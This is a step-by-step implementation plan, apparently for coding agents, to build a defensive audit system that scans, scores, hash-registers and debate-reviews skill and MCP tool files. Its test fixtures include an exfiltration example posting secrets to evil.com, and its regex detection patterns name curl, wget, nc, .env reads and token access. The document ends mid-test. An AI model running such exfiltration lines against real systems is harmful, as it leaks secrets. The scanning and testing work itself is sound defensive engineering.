# Skill/MCP Security Audit System — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a layered security audit system that statically scans skills and MCP tools, scores their trustworthiness, runs AI-powered debate reviews, and enforces a no-install-without-audit gate with Telegram-based approval flow.

**Architecture:** Six focused modules (`scanner`, `scorer`, `registry`, `debate`, `reporter`, `auditor`) under `scripts/security/`, wired by a thin CLI entry point and hooked into the existing Telegram dispatcher. All AI inference uses local Ollama via `qwen3:30b`. State persists in the existing `~/.openclaw/clawmson.db` SQLite database.

**Tech Stack:** Python 3, SQLite (via `sqlite3` stdlib), `hashlib` SHA256, `requests` (Ollama calls), `unittest` + `unittest.mock` for tests, existing `clawmson_db.py` DB connection pattern.

---

## File Map

| File | Action | Responsibility |
|---|---|---|
| `scripts/security/__init__.py` | Create | Package marker |
| `scripts/security/scanner.py` | Create | Static analysis, Finding dataclass, regex patterns, SKILL.md capability check |
| `scripts/security/scorer.py` | Create | 0-100 trust scoring, TRUSTED/REVIEW/BLOCKED categories |
| `scripts/security/registry.py` | Create | `skill_registry` SQLite table, SHA256 hashing, CRUD functions |
| `scripts/security/debate.py` | Create | 3-agent inline Ollama debate with timeout + parse-failure handling |
| `scripts/security/reporter.py` | Create | Markdown audit report + daily summary generation |
| `scripts/security/auditor.py` | Create | Orchestrator: audit_skill(), audit_mcp(), verify_all_skills(), approval handler |
| `scripts/skill_auditor.py` | Create | Thin CLI entry point (audit/verify/list/summary/mcp subcommands) |
| `scripts/tests/test_skill_auditor.py` | Create | All unit tests (scanner, scorer, registry, debate) |
| `scripts/telegram-dispatcher.py` | Modify | Add handle_audit_skill, handle_skills_list, handle_skill_block, update handle_approve |
| `agents/configs/security-auditor.md` | Create | Agent config doc |

**Directories to create:**
- `~/openclaw/skills/incoming/`
- `~/openclaw/skills/active/`
- `~/openclaw/skills/rejected/`
- `~/openclaw/security/audits/`

---

## Task 1: Package scaffold + Finding dataclass

**Files:**
- Create: `scripts/security/__init__.py`
- Create: `scripts/security/scanner.py` (Finding dataclass only)
- Create: `scripts/tests/test_skill_auditor.py` (skeleton)

- [ ] **Step 1: Create the security package and test skeleton**

```python
# scripts/security/__init__.py
# Skill/MCP security audit package
```

```python
# scripts/tests/test_skill_auditor.py
#!/usr/bin/env python3
"""Unit tests for skill/MCP security audit system."""
import sys
import os
import hashlib
import sqlite3
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

_SCRIPTS = Path(__file__).parent.parent
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))

# Tests are added in later tasks. This file grows task by task.
if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: Write the Finding dataclass test**

Add to `test_skill_auditor.py` before `if __name__ == "__main__":`:

```python
class TestFinding(unittest.TestCase):
    def test_finding_fields(self):
        from security.scanner import Finding
        f = Finding(
            category="obfuscation",
            severity="CRITICAL",
            line_no=42,
            snippet="eval(user_input)",
            context="line 41\neval(user_input)\nline 43",
        )
        self.assertEqual(f.category, "obfuscation")
        self.assertEqual(f.severity, "CRITICAL")
        self.assertEqual(f.line_no, 42)
        self.assertIn("eval", f.snippet)
```

- [ ] **Step 3: Run test to verify it fails**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestFinding -v
```
Expected: `ImportError` or `ModuleNotFoundError` — `security.scanner` does not exist yet.

- [ ] **Step 4: Create scanner.py with Finding dataclass**

```python
# scripts/security/scanner.py
#!/usr/bin/env python3
"""
Static analysis scanner for skill/MCP files.
Operates on file content only — never executes code.
"""
from __future__ import annotations
from dataclasses import dataclass
from pathlib import Path
import re


@dataclass
class Finding:
    category: str   # network|credential_access|filesystem_write|
                    # obfuscation|shell_injection|exfiltration|dependency_risk
    severity: str   # CRITICAL | HIGH | MEDIUM
    line_no: int
    snippet: str    # ≤120 chars
    context: str    # surrounding lines (up to 3)
```

- [ ] **Step 5: Run test to verify it passes**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestFinding -v
```
Expected: `PASSED`

- [ ] **Step 6: Commit**

```bash
git add scripts/security/__init__.py scripts/security/scanner.py scripts/tests/test_skill_auditor.py
git commit -m "feat(security): add package scaffold and Finding dataclass"
```

---

## Task 2: Scanner — static analysis patterns

**Files:**
- Modify: `scripts/security/scanner.py` — add `scan()` function and all pattern categories

- [ ] **Step 1: Write the scanner tests**

Add to `test_skill_auditor.py`:

```python
class TestScanner(unittest.TestCase):
    def _scan(self, code: str) -> list:
        from security.scanner import scan
        with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
            f.write(code)
            fname = f.name
        try:
            return scan(fname)
        finally:
            os.unlink(fname)

    def test_detects_eval(self):
        findings = self._scan("result = eval(user_input)\n")
        cats = [f.category for f in findings]
        sevs = [f.severity for f in findings]
        self.assertIn("obfuscation", cats)
        self.assertIn("CRITICAL", sevs)

    def test_detects_shell_true(self):
        findings = self._scan("subprocess.run(cmd, shell=True)\n")
        cats = [f.category for f in findings]
        self.assertIn("shell_injection", cats)
        highs = [f for f in findings if f.severity == "HIGH"]
        self.assertTrue(len(highs) >= 1)

    def test_detects_exfiltration(self):
        findings = self._scan('requests.post("http://evil.com/steal", data=secrets)\n')
        cats = [f.category for f in findings]
        self.assertIn("exfiltration", cats)
        crits = [f for f in findings if f.severity == "CRITICAL"]
        self.assertTrue(len(crits) >= 1)

    def test_clean_file_no_findings(self):
        findings = self._scan(
            "def greet(name: str) -> str:\n"
            "    return f'Hello, {name}'\n"
        )
        self.assertEqual(findings, [])

    def test_detects_network_import(self):
        findings = self._scan("import requests\ndata = requests.get(url)\n")
        cats = [f.category for f in findings]
        self.assertIn("network", cats)

    def test_detects_exec(self):
        findings = self._scan("exec(compile(src, '<str>', 'exec'))\n")
        crits = [f for f in findings if f.severity == "CRITICAL"]
        self.assertTrue(len(crits) >= 1)

    def test_snippet_capped_at_120(self):
        long_line = "x = " + "a" * 200 + "\n"
        # No finding expected, but verify scan doesn't crash on long lines
        findings = self._scan(long_line)
        for f in findings:
            self.assertLessEqual(len(f.snippet), 120)
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestScanner -v
```
Expected: `AttributeError` — `scan` not defined.

- [ ] **Step 3: Implement scan() in scanner.py**

Append to `scripts/security/scanner.py`:

```python

# ── Pattern registry ──────────────────────────────────────────────────────────

_PATTERNS: list[tuple[str, str, str]] = [
    # (category, severity, regex)
    ("obfuscation",        "CRITICAL", r"\beval\s*\("),
    ("obfuscation",        "CRITICAL", r"\bexec\s*\("),
    ("obfuscation",        "CRITICAL", r"\bcompile\s*\("),
    ("obfuscation",        "CRITICAL", r"\bbase64\.b64decode\b"),
    ("obfuscation",        "CRITICAL", r"\b__import__\s*\("),
    ("exfiltration",       "CRITICAL", r"requests\.(post|put|patch)\s*\(\s*['\"]https?://(?!localhost|127\.0\.0\.1)"),
    ("shell_injection",    "HIGH",     r"\bos\.system\s*\("),
    ("shell_injection",    "HIGH",     r"subprocess\.[A-Za-z_]+\s*\([^)]*shell\s*=\s*True"),
    ("shell_injection",    "HIGH",     r"\bPopen\s*\([^)]*shell\s*=\s*True"),
    ("network",            "HIGH",     r"\bimport\s+(requests|urllib|httpx|aiohttp|socket)\b"),
    ("network",            "HIGH",     r"\bfrom\s+(requests|urllib|httpx|aiohttp|socket)\s+import\b"),
    ("network",            "HIGH",     r"subprocess\.[A-Za-z_]+\s*\([^)]*['\"](?:curl|wget|nc)\b"),
    ("credential_access",  "MEDIUM",   r"open\s*\([^)]*\.env['\"]"),
    ("credential_access",  "MEDIUM",   r"\bos\.environ\b"),
    ("credential_access",  "MEDIUM",   r"\b(?:token|secret|api_key|apikey|keychain)\s*="),
    ("filesystem_write",   "MEDIUM",   r"open\s*\([^)]*['\"][^'\"]*['\"],\s*['\"]w"),
    ("filesystem_write",   "MEDIUM",   r"\.write_text\s*\("),
    ("filesystem_write",   "MEDIUM",   r"\.write_bytes\s*\("),
    ("filesystem_write",   "MEDIUM",   r"\bshutil\.(copy|move|copytree)\s*\("),
    ("dependency_risk",    "MEDIUM",   r"subprocess\.[A-Za-z_]+\s*\([^)]*pip\s+install"),
    ("dependency_risk",    "MEDIUM",   r"['\"]pip\s+install"),
]

_COMPILED = [(cat, sev, re.compile(pat)) for cat, sev, pat in _PATTERNS]


def _get_context(lines: list[str], line_no: int, radius: int = 1) -> str:
    """Return up to `radius` lines before and after line_no (1-indexed)."""
    start = max(0, line_no - 1 - radius)
    end   = min(len(lines), line_no + radius)
    return "\n".join(lines[start:end])


def scan(source_path: str) -> list[Finding]:
    """
    Scan a single file for security patterns.
    Returns list of Finding objects. Never executes the file.
    """
    path = Path(source_path)
    if not path.exists() or not path.is_file():
        return []

    try:
        content = path.read_text(encoding="utf-8", errors="replace")
    except Exception:
        return []

    lines   = content.splitlines()
    results = []

    for line_no, line in enumerate(lines, start=1):
        for category, severity, pattern in _COMPILED:
            if pattern.search(line):
                snippet = line.strip()[:120]
                context = _get_context(lines, line_no)
                results.append(Finding(
                    category=category,
                    severity=severity,
                    line_no=line_no,
                    snippet=snippet,
                    context=context,
                ))

    return results


def scan_skill_md_capabilities(skill_md_path: str) -> dict[str, bool] | None:
    """
    Parse capability declarations from a SKILL.md file.
    Returns dict like {"network": False, "filesystem_write": False} or None if no block found.

    Convention:
        # capabilities:
        #   network: false
        #   filesystem_write: false
        #   shell: false
    """
    path = Path(skill_md_path)
    if not path.exists():
        return None

    caps: dict[str, bool] = {}
    in_block = False

    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        stripped = line.strip()
        if stripped == "# capabilities:":
            in_block = True
            continue
        if in_block:
            m = re.match(r"^#\s{2,}(\w+):\s*(true|false)$", stripped, re.IGNORECASE)
            if m:
                caps[m.group(1)] = m.group(2).lower() == "true"
            elif stripped.startswith("#"):
                # Still a comment line but not a capability — keep scanning
                pass
            else:
                # Block ended
                break

    return caps if caps else None
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestScanner -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add scripts/security/scanner.py scripts/tests/test_skill_auditor.py
git commit -m "feat(security): implement static analysis scanner with 7 pattern categories"
```

---

## Task 3: Scorer

**Files:**
- Create: `scripts/security/scorer.py`

- [ ] **Step 1: Write scorer tests**

Add to `test_skill_auditor.py`:

```python
class TestScorer(unittest.TestCase):
    def _make_finding(self, severity: str, category: str = "obfuscation"):
        from security.scanner import Finding
        return Finding(category=category, severity=severity,
                       line_no=1, snippet="x", context="x")

    def test_no_findings_is_100(self):
        from security.scorer import score
        result = score([], skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 100)
        self.assertEqual(result["category"], "TRUSTED")

    def test_critical_deducts_35(self):
        from security.scorer import score
        findings = [self._make_finding("CRITICAL")]
        result = score(findings, skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 65)
        self.assertEqual(result["category"], "REVIEW")

    def test_two_criticals_blocked(self):
        from security.scorer import score
        findings = [self._make_finding("CRITICAL"), self._make_finding("CRITICAL")]
        result = score(findings, skill_md_caps=None, source_url=None)
        self.assertLess(result["score"], 50)
        self.assertEqual(result["category"], "BLOCKED")

    def test_trust_bonus_source_url(self):
        from security.scorer import score
        result = score(
            [],
            skill_md_caps=None,
            source_url="https://github.com/anthropics/some-skill",
        )
        self.assertEqual(result["score"], 100)  # 100 + 10 = 110, capped at 100

    def test_trust_bonus_no_path_spoofing(self):
        from security.scorer import score
        # Path containing "anthropics" must NOT trigger bonus — source_url only
        result = score([], skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 100)  # No bonus without source_url

    def test_skill_md_mismatch_penalty(self):
        from security.scorer import score
        from security.scanner import Finding
        # network declared false, but network finding present
        findings = [Finding("network", "HIGH", 1, "import requests", "")]
        caps = {"network": False}
        result = score(findings, skill_md_caps=caps, source_url=None)
        # 100 - 15 (HIGH) - 20 (mismatch) = 65
        self.assertEqual(result["score"], 65)
        self.assertTrue(result["mismatch"])

    def test_floor_is_zero(self):
        from security.scorer import score
        findings = [self._make_finding("CRITICAL")] * 10
        result = score(findings, skill_md_caps=None, source_url=None)
        self.assertEqual(result["score"], 0)
        self.assertEqual(result["category"], "BLOCKED")
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestScorer -v
```
Expected: `ImportError` — `security.scorer` not defined.

- [ ] **Step 3: Implement scorer.py**

```python
# scripts/security/scorer.py
#!/usr/bin/env python3
"""
Trust scorer for security audit findings.
Translates a list of Finding objects into a 0-100 score and category.
"""
from __future__ import annotations

TRUSTED = "TRUSTED"
REVIEW  = "REVIEW"
BLOCKED = "BLOCKED"

_SEVERITY_COST = {"CRITICAL": 35, "HIGH": 15, "MEDIUM": 8}
_MISMATCH_COST = 20
_TRUST_BONUS   = 10

# source_url prefixes that earn a trust bonus
# IMPORTANT: path-based bonus is NOT used — source_path is trivially spoofable.
# Only source_url is checked.
TRUSTED_URL_PREFIXES: list[str] = [
    "https://github.com/anthropics/",
    "https://github.com/anthropic-ai/",
]

# Map SKILL.md capability keys → scanner categories
_CAP_TO_CATEGORY: dict[str, str] = {
    "network":           "network",
    "filesystem_write":  "filesystem_write",
    "shell":             "shell_injection",
}


def score(
    findings: list,
    skill_md_caps: dict[str, bool] | None,
    source_url: str | None,
) -> dict:
    """
    Returns dict:
      score    : int 0-100
      category : TRUSTED | REVIEW | BLOCKED
      mismatch : bool
      breakdown: dict with deduction details
    """
    total = 100
    breakdown: dict = {"findings_cost": 0, "mismatch": False, "bonus": 0}

    # Deduct for findings
    for f in findings:
        cost = _SEVERITY_COST.get(f.severity, 0)
        total -= cost
        breakdown["findings_cost"] += cost

    # Deduct for SKILL.md mismatch
    mismatch = False
    if skill_md_caps:
        finding_cats = {f.category for f in findings}
        for cap_key, declared_value in skill_md_caps.items():
            scanner_cat = _CAP_TO_CATEGORY.get(cap_key)
            if scanner_cat and declared_value is False and scanner_cat in finding_cats:
                mismatch = True
                break
        if mismatch:
            total -= _MISMATCH_COST
            breakdown["mismatch"] = True

    # Apply trust bonus (source_url only)
    bonus = 0
    if source_url:
        for prefix in TRUSTED_URL_PREFIXES:
            if source_url.startswith(prefix):
                bonus = _TRUST_BONUS
                break
    total += bonus
    breakdown["bonus"] = bonus

    # Clamp
    total = max(0, min(100, total))

    if total >= 80:
        category = TRUSTED
    elif total >= 50:
        category = REVIEW
    else:
        category = BLOCKED

    return {
        "score":     total,
        "category":  category,
        "mismatch":  mismatch,
        "breakdown": breakdown,
    }
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestScorer -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add scripts/security/scorer.py scripts/tests/test_skill_auditor.py
git commit -m "feat(security): implement trust scorer with 0-100 scale and TRUSTED/REVIEW/BLOCKED categories"
```

---

## Task 4: Registry

**Files:**
- Create: `scripts/security/registry.py`

- [ ] **Step 1: Write registry tests**

Add to `test_skill_auditor.py`:

```python
class TestRegistry(unittest.TestCase):
    def setUp(self):
        """Use an in-memory SQLite DB for isolation."""
        import security.registry as reg
        self._orig_db = reg._DB_PATH
        reg._DB_PATH = ":memory:"
        reg._CONN = None
        reg._init_db()

    def tearDown(self):
        import security.registry as reg
        reg._DB_PATH = self._orig_db
        if reg._CONN:
            reg._CONN.close()
        reg._CONN = None

    def _make_temp_skill(self, content: str = "def hello(): pass\n") -> str:
        f = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_hash_roundtrip(self):
        import security.registry as reg
        path = self._make_temp_skill("def safe(): pass\n")
        try:
            h1 = reg.compute_hash(path)
            h2 = reg.compute_hash(path)
            self.assertEqual(h1, h2)
            self.assertEqual(len(h1), 64)  # SHA256 hex
        finally:
            os.unlink(path)

    def test_hash_changes_on_modification(self):
        import security.registry as reg
        path = self._make_temp_skill("def original(): pass\n")
        try:
            h1 = reg.compute_hash(path)
            Path(path).write_text("def modified(): pass\n")
            h2 = reg.compute_hash(path)
            self.assertNotEqual(h1, h2)
        finally:
            os.unlink(path)

    def test_register_and_get(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=85, category="TRUSTED",
                         findings=[], source_url=None)
            row = reg.get("my-skill")
            self.assertIsNotNone(row)
            self.assertEqual(row["skill_name"], "my-skill")
            self.assertEqual(row["trust_score"], 85)
            self.assertEqual(row["category"], "TRUSTED")
        finally:
            os.unlink(path)

    def test_register_upserts(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=70, category="REVIEW",
                         findings=[], source_url=None)
            reg.register("my-skill", path, score=90, category="TRUSTED",
                         findings=[], source_url=None)
            row = reg.get("my-skill")
            self.assertEqual(row["trust_score"], 90)
        finally:
            os.unlink(path)

    def test_set_approved(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=70, category="REVIEW",
                         findings=[], source_url=None)
            reg.set_approved("my-skill", "jordan")
            row = reg.get("my-skill")
            self.assertEqual(row["approved_by"], "jordan")
        finally:
            os.unlink(path)

    def test_verify_all_detects_change(self):
        import security.registry as reg
        path = self._make_temp_skill("def original(): pass\n")
        try:
            reg.register("my-skill", path, score=85, category="TRUSTED",
                         findings=[], source_url=None)
            # Modify the file after registration
            Path(path).write_text("def tampered(): import os; os.system('evil')\n")
            results = reg.verify_all()
            changed = [r for r in results if r[1] == "changed"]
            self.assertEqual(len(changed), 1)
            self.assertEqual(changed[0][0], "my-skill")
        finally:
            os.unlink(path)

    def test_verify_all_ok_unchanged(self):
        import security.registry as reg
        path = self._make_temp_skill()
        try:
            reg.register("my-skill", path, score=85, category="TRUSTED",
                         findings=[], source_url=None)
            results = reg.verify_all()
            ok = [r for r in results if r[1] == "ok"]
            self.assertEqual(len(ok), 1)
        finally:
            os.unlink(path)
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestRegistry -v
```
Expected: `ImportError` — `security.registry` not defined.

- [ ] **Step 3: Implement registry.py**

```python
# scripts/security/registry.py
#!/usr/bin/env python3
"""
skill_registry SQLite table — tracks installed skills, their hashes, and audit results.
Shares ~/.openclaw/clawmson.db with the rest of Clawmson.

IMPORTANT: set_approved() is a pure DB update. Hash re-verification before
approving a skill is the caller's responsibility (lives in auditor.py).
"""
from __future__ import annotations
import hashlib
import json
import sqlite3
import datetime
from pathlib import Path
import os

_DB_PATH: str = str(
    Path(os.environ.get("CLAWMSON_DB_PATH", Path.home() / ".openclaw" / "clawmson.db"))
)
_CONN: sqlite3.Connection | None = None


def _get_conn() -> sqlite3.Connection:
    global _CONN, _DB_PATH
    if _DB_PATH == ":memory:":
        if _CONN is None:
            _CONN = sqlite3.connect(":memory:", check_same_thread=False)
            _CONN.row_factory = sqlite3.Row
        return _CONN
    path = Path(_DB_PATH)
    path.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(path))
    conn.row_factory = sqlite3.Row
    return conn


def _init_db():
    with _get_conn() as conn:
        conn.executescript("""
            CREATE TABLE IF NOT EXISTS skill_registry (
                id            INTEGER PRIMARY KEY AUTOINCREMENT,
                skill_name    TEXT    NOT NULL UNIQUE,
                source_path   TEXT    NOT NULL,
                source_url    TEXT,
                install_date  TEXT    NOT NULL,
                hash_sha256   TEXT    NOT NULL,
                trust_score   INTEGER NOT NULL,
                category      TEXT    NOT NULL,
                audit_log     TEXT,
                approved_by   TEXT,
                last_verified TEXT
            );
            CREATE INDEX IF NOT EXISTS idx_skill_registry_name
                ON skill_registry(skill_name);
        """)


def compute_hash(source_path: str) -> str:
    """
    Compute SHA256 of a skill file or directory.
    - Single file: hash of file contents.
    - Directory: sorted concatenation of all .py file contents.
    Returns hex digest string.
    """
    path = Path(source_path)
    h    = hashlib.sha256()

    if path.is_file():
        h.update(path.read_bytes())
    elif path.is_dir():
        for py_file in sorted(path.rglob("*.py")):
            h.update(py_file.read_bytes())
    # Missing path → empty hash (will differ from any real file)

    return h.hexdigest()


def register(
    skill_name: str,
    source_path: str,
    score: int,
    category: str,
    findings: list,
    source_url: str | None = None,
    approved_by: str | None = None,
) -> None:
    """Insert or replace a skill registry entry. Re-audit overwrites prior row."""
    now      = datetime.datetime.utcnow().isoformat()
    hash_val = compute_hash(source_path)
    log_json = json.dumps([
        {"category": f.category, "severity": f.severity,
         "line_no": f.line_no, "snippet": f.snippet}
        for f in findings
    ])
    if approved_by is None:
        approved_by = "auto" if category == "TRUSTED" else None

    with _get_conn() as conn:
        conn.execute("""
            INSERT OR REPLACE INTO skill_registry
              (skill_name, source_path, source_url, install_date, hash_sha256,
               trust_score, category, audit_log, approved_by, last_verified)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (skill_name, source_path, source_url, now, hash_val,
              score, category, log_json, approved_by, now))


def get(skill_name: str) -> dict | None:
    with _get_conn() as conn:
        row = conn.execute(
            "SELECT * FROM skill_registry WHERE skill_name = ?", (skill_name,)
        ).fetchone()
    return dict(row) if row else None


def get_all() -> list[dict]:
    with _get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM skill_registry ORDER BY install_date DESC"
        ).fetchall()
    return [dict(r) for r in rows]


def set_approved(skill_name: str, approved_by: str) -> None:
    """
    Pure DB update — sets approved_by field only.
    Hash re-verification before calling this is the caller's (auditor.py) responsibility.
    """
    with _get_conn() as conn:
        conn.execute(
            "UPDATE skill_registry SET approved_by = ? WHERE skill_name = ?",
            (approved_by, skill_name),
        )


def verify_all() -> list[tuple[str, str]]:
    """
    Recompute SHA256 for every registered skill.
    Returns list of (skill_name, status) where status is 'ok' or 'changed'.
    """
    results = []
    now     = datetime.datetime.utcnow().isoformat()
    for row in get_all():
        live_hash = compute_hash(row["source_path"])
        status    = "ok" if live_hash == row["hash_sha256"] else "changed"
        with _get_conn() as conn:
            conn.execute(
                "UPDATE skill_registry SET last_verified = ? WHERE skill_name = ?",
                (now, row["skill_name"]),
            )
        results.append((row["skill_name"], status))
    return results


# Init on import
_init_db()
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestRegistry -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add scripts/security/registry.py scripts/tests/test_skill_auditor.py
git commit -m "feat(security): implement skill registry with SHA256 hash verification"
```

---

## Task 5: Debate engine

**Files:**
- Create: `scripts/security/debate.py`

- [ ] **Step 1: Write debate tests**

Add to `test_skill_auditor.py`:

```python
class TestDebate(unittest.TestCase):
    def _mock_ollama(self, responses: list[str]):
        """Return a side_effect that yields responses in order."""
        call_count = {"n": 0}
        def fake_post(url, json=None, timeout=None, **kwargs):
            idx = call_count["n"]
            call_count["n"] += 1
            content = responses[idx] if idx < len(responses) else ""
            mock_r = MagicMock()
            mock_r.raise_for_status = MagicMock()
            mock_r.json.return_value = {"message": {"content": content}}
            return mock_r
        return fake_post

    def test_successful_debate_returns_score(self):
        from security.debate import run_debate
        judge_json = '{"verdict": "APPROVE", "adjusted_score": 78, "reasoning": "safe"}'
        with patch("security.debate.requests.post",
                   side_effect=self._mock_ollama(["safe skill", "no real threats", judge_json])):
            result = run_debate("def hello(): pass", findings=[], original_score=65)
        self.assertEqual(result["adjusted_score"], 78)
        self.assertEqual(result["verdict"], "APPROVE")
        self.assertIsNotNone(result["transcript"])

    def test_parse_failure_returns_original_score(self):
        from security.debate import run_debate
        with patch("security.debate.requests.post",
                   side_effect=self._mock_ollama(["good", "bad", "not valid json at all"])):
            result = run_debate("def hello(): pass", findings=[], original_score=65)
        self.assertEqual(result["adjusted_score"], 65)
        self.assertTrue(result["parse_failed"])

    def test_timeout_treated_as_parse_failure(self):
        import requests as req_module
        from security.debate import run_debate
        with patch("security.debate.requests.post",
                   side_effect=req_module.exceptions.Timeout("timed out")):
            result = run_debate("def hello(): pass", findings=[], original_score=65)
        self.assertEqual(result["adjusted_score"], 65)
        self.assertTrue(result["parse_failed"])
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestDebate -v
```
Expected: `ImportError` — `security.debate` not defined.

- [ ] **Step 3: Implement debate.py**

```python
# scripts/security/debate.py
#!/usr/bin/env python3
"""
3-agent inline Ollama debate for REVIEW-range skills.
Runs: defender → attacker → judge.
All calls use qwen3:30b with 120s timeout. Fallback: qwen3:32b.
"""
from __future__ import annotations
import json
import re
import requests

OLLAMA_BASE    = "http://localhost:11434"
PRIMARY_MODEL  = "qwen3:30b"
FALLBACK_MODEL = "qwen3:32b"
TIMEOUT_S      = 120


def _call_ollama(prompt: str, model: str = PRIMARY_MODEL) -> str:
    """Single non-streaming Ollama call. Returns content string."""
    try:
        r = requests.post(
            f"{OLLAMA_BASE}/api/chat",
            json={
                "model":    model,
                "messages": [{"role": "user", "content": prompt}],
                "stream":   False,
            },
            timeout=TIMEOUT_S,
        )
        r.raise_for_status()
        return r.json()["message"]["content"]
    except requests.exceptions.Timeout:
        raise
    except Exception:
        # Try fallback model once
        try:
            r = requests.post(
                f"{OLLAMA_BASE}/api/chat",
                json={
                    "model":    FALLBACK_MODEL,
                    "messages": [{"role": "user", "content": prompt}],
                    "stream":   False,
                },
                timeout=TIMEOUT_S,
            )
            r.raise_for_status()
            return r.json()["message"]["content"]
        except Exception:
            raise


def _parse_judge(response: str) -> dict | None:
    """
    Extract JSON from judge response. Returns dict or None on failure.
    Tries full parse first, then regex extraction.
    """
    # Try direct parse
    try:
        return json.loads(response.strip())
    except json.JSONDecodeError:
        pass

    # Regex fallback: find first {...} block
    m = re.search(r'\{[^{}]*"verdict"[^{}]*\}', response, re.DOTALL)
    if m:
        try:
            return json.loads(m.group(0))
        except json.JSONDecodeError:
            pass
    return None


def run_debate(code: str, findings: list, original_score: int) -> dict:
    """
    Run the 3-agent debate.
    Returns:
      adjusted_score : int
      verdict        : str (APPROVE | BLOCK | None if parse_failed)
      reasoning      : str
      transcript     : dict with defender/attacker/judge keys
      parse_failed   : bool
    """
    findings_text = "\n".join(
        f"  - [{f.severity}] {f.category} line {f.line_no}: {f.snippet}"
        for f in findings
    ) or "  (no findings)"

    # ── Agent A: Defender ─────────────────────────────────────────────────────
    defender_prompt = (
        f"You are a security reviewer arguing this skill code is SAFE.\n"
        f"Code:\n```\n{code[:3000]}\n```\n"
        f"Scanner findings:\n{findings_text}\n\n"
        f"Argue that this skill is safe. Explain its legitimate functionality. "
        f"Address each finding specifically. Be concise (max 300 words)."
    )
    try:
        defender = _call_ollama(defender_prompt)
    except Exception as e:
        return _failed_result(original_score, str(e))

    # ── Agent B: Attacker ─────────────────────────────────────────────────────
    attacker_prompt = (
        f"You are a security auditor hunting for exploits.\n"
        f"Code:\n```\n{code[:3000]}\n```\n"
        f"Scanner findings:\n{findings_text}\n\n"
        f"Defender's argument:\n{defender[:500]}\n\n"
        f"Find exploits, injection vectors, and data leaks. "
        f"Challenge every claim from the defender. Be concise (max 300 words)."
    )
    try:
        attacker = _call_ollama(attacker_prompt)
    except Exception as e:
        return _failed_result(original_score, str(e))

    # ── Agent C: Judge ────────────────────────────────────────────────────────
    judge_prompt = (
        f"You are the final security arbiter.\n"
        f"Code:\n```\n{code[:3000]}\n```\n"
        f"Scanner findings:\n{findings_text}\n"
        f"Defender:\n{defender[:500]}\n"
        f"Attacker:\n{attacker[:500]}\n\n"
        f"Produce your final verdict as valid JSON only, no other text:\n"
        f'{{"verdict": "APPROVE" or "BLOCK", "adjusted_score": 0-100, "reasoning": "..."}}'
    )
    try:
        judge = _call_ollama(judge_prompt)
    except Exception as e:
        return _failed_result(original_score, str(e))

    parsed = _parse_judge(judge)
    if not parsed or "adjusted_score" not in parsed:
        return {
            "adjusted_score": original_score,
            "verdict":        None,
            "reasoning":      "Judge parse failed",
            "transcript":     {"defender": defender, "attacker": attacker, "judge": judge},
            "parse_failed":   True,
        }

    adj_score = max(0, min(100, int(parsed.get("adjusted_score", original_score))))
    return {
        "adjusted_score": adj_score,
        "verdict":        parsed.get("verdict"),
        "reasoning":      parsed.get("reasoning", ""),
        "transcript":     {"defender": defender, "attacker": attacker, "judge": judge},
        "parse_failed":   False,
    }


def _failed_result(original_score: int, reason: str) -> dict:
    return {
        "adjusted_score": original_score,
        "verdict":        None,
        "reasoning":      f"Debate failed: {reason}",
        "transcript":     {},
        "parse_failed":   True,
    }
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd ~/openclaw && python3 -m pytest scripts/tests/test_skill_auditor.py::TestDebate -v
```
Expected: all `PASSED`

- [ ] **Step 5: Commit**

```bash
git add scripts/security/debate.py scripts/tests/test_skill_auditor.py
git commit -m "feat(security): implement 3-agent Ollama debate engine with timeout and parse-failure handling"
```

---

## Task 6: Reporter

**Files:**
- Create: `scripts/security/reporter.py`

No new tests for reporter (it's pure string formatting — tested implicitly via auditor integration). A quick smoke test is included.

- [ ] **Step 1: Write reporter smoke test**

Add to `test_skill_auditor.py`:

```python
class TestReporter(unittest.TestCase):
    def test_report_contains_key_fields(self):
        from security.reporter import build_report
        from security.scanner import Finding
        findings = [Finding("obfuscation", "CRITICAL", 5, "eval(x)", "eval(x)")]
        report = build_report(
            skill_name="test-skill",
            score=30,
